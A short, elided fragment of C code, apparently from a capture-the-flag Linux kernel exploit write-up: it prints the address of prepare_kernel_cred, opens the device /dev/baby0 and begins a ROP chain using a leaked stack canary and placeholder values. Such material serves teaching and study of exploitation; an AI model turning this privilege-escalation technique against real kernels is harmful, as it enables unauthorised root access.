...
int main()
{
    ...
    printf("prepare_kernel_cred address : %p\n", prepare_kernel_cred);
 
    if ((fd = open("/dev/baby0", O_RDWR)) < 0) {

        printf("Cannot open /dev/baby0.\n");
        return 0;
    }
    ...
    rop[k++] = canary;
    rop[k++] = 0x4141414141414141; 
    rop[k++] = 0x4242424242424242; 
    rop[k++] = 0x4343434343434343; 
